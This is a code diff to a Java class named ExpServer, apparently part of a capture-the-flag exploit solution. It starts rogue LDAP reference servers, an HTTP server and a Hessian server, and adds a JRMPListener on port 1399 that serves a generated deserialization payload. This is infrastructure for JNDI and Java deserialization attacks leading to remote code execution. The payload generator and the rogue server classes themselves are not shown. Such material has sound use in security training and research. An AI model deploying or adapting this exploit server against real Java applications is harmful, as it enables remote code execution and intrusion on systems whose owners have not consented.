@@ -3,7 +3,7 @@ package solution;
 import tools.http.Server;
 
 public class ExpServer {
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
         LdapRefServer0 ldapRefServer0 = new LdapRefServer0();
         Server server = new Server();
         LdapRefServer1 ldapRefServer1 = new LdapRefServer1();
@@ -14,9 +14,17 @@ public class ExpServer {
         Thread ldap1Thread = new Thread(ldapRefServer1);
         Thread hessianServerThread = new Thread(hessianServer);
 
+        Object payload = PayloadGenerator.getPayload();
+        int port = 1399;
+        JRMPListener jrmpListener = new JRMPListener(port, payload);
+        Thread jrmp = new Thread(jrmpListener);
+
         ldap0Thread.start();
         serverThread.start();
         ldap1Thread.start();
         hessianServerThread.start();
+
+        jrmp.start();
+
     }
 }
